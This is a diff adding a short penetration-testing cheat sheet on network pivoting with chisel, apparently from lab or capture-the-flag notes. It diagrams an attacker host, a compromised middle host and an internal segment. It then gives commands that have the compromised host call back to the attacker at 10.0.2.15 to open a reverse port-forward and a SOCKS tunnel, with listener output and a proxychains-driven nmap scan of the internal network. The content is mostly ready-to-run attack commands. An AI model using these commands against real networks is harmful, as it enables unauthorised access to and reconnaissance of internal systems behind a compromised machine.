@@ -1,0 +1,43 @@
+Attacker <===============>   Medium_Host   <==============> Next_Segment_Host
+10.0.2.15              10.0.2.22 | 192.168.2.4              192.168.2.5
+port-9999                    port-8080                          ?????
+port-4040                     socks
+port-1080
+
+
+Reverse Port Forwarding/Tunnel
+------------------------------
+R:<local-interface>:<local-port>:<remote-host>:<remote-port>/<protocol>
+
+[which does reverse port forwarding, sharing <remote-host>:<remote-port>
+  from the client to the server's <local-interface>:<local-port>]
+  
+
+In Attacker Server =====>   chisel  server   -port 9999   --reverse
+In Medium Host  =====>   chisel  client  10.0.2.15:9999   R:4040:127.0.0.1:8080    [Server open/listen 4040 to access 8080 of medium_host]
+
+
+Server will show message ===>   "......tun: proxy#R:4040=>8080: Listening"
+└─$ ss -luptn                 
+Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port  Process                             
+tcp     LISTEN   0        4096                   *:4040                *:*      users:(("chisel",pid=2091,fd=8))   
+tcp     LISTEN   0        4096                   *:9999                *:*      users:(("chisel",pid=2091,fd=6)) 
+
+Try access to client in Server host  ===>   curl  http://127.0.0.1:4040   <=====>   http://10.0.2.22:8080
+
+_______________________________________________________________________________________________________________________________
+
+
+For ProxyChains via Medium_Host
+--------------------------------
+Attacker =====>  chisel  server   -port 9999   --reverse
+Medium_Host =====>  chisel  client  10.0.2.15:9999  R:1080:socks    [Server open 1080 for proxychains access via medium_host]
+
+Server will show message ===>  ".....tun: proxy#R:127.0.0.1:1080=>socks: Listening"
+└─$ ss -luptn                     
+Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port  Process                             
+tcp     LISTEN   0        4096           127.0.0.1:1080          0.0.0.0:*      users:(("chisel",pid=2645,fd=8))   
+tcp     LISTEN   0        4096                   *:9999                *:*      users:(("chisel",pid=2645,fd=6)) 
+
+Edit in Attacker ===>  /etc/proxychains4.conf  ===>  Add "socks5  127.0.0.1  1080"
+Try Scan to Next_Segment_Host using proxychains  ===>  proxychains  nmap  192.168.2.5
